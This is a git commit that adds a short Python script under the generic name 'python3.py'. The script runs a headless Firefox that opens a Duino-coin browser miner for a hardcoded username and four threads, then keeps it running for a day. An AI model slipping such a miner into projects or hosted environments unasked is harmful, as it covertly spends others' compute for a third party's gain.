d3365b439a416fc20944bd80b7d44038cf9fbc44
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-03-25 03:59:08 +0700

    Create python3.py

---
+++ python3.py
@@ -0,0 +1,12 @@
+#!/usr/bin/env python
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from time import sleep
+
+options = Options()
+options.headless = True
+driver = webdriver.Firefox(options=options)
+
+driver.get('https://server.duinocoin.com/webminer.html?username=LuthfiMF&threads=4')
+sleep(86400)
